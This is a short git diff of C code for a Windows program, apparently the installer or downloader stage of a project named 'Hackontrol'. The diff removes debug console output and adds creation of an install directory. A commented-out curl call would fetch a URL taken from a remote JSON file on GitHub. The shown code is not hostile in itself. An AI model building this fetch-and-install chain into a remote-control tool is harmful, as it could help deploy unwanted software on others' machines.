@@ -1,6 +1,7 @@
 #include <cJSON.h>
 #define CURL_STATICLIB
 #include <curl/curl.h>
+#include <ShlObj_core.h>
 
 #define SYSTEM_JSON "https://raw.githubusercontent.com/KHOPAN/Hackontrol/refs/heads/main/system/system.json"
 
@@ -233,12 +234,14 @@ int WINAPI WinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE previousInstance,
 		goto deleteRoot;
 	}
 
-	AllocConsole();
-	FILE* file = stdout;
-	freopen_s(&file, "CONOUT$", "w", stdout);
-	file = stderr;
-	freopen_s(&file, "CONOUT$", "w", stderr);
-	printf("%s\n%lu\n", locationBuffer, length);
+	length = SHCreateDirectoryExA(NULL, locationBuffer, NULL);
+
+	if(length != ERROR_SUCCESS && length != ERROR_ALREADY_EXISTS && length != ERROR_FILE_EXISTS) {
+		HeapFree(processHeap, 0, locationBuffer);
+		win32Error(L"SHCreateDirectoryExW", length);
+		goto deleteRoot;
+	}
+
 	HeapFree(processHeap, 0, locationBuffer);
 
 	/*if((code = curl_easy_setopt(curl, CURLOPT_URL, cJSON_GetStringValue(urlItem))) != CURLE_OK) {
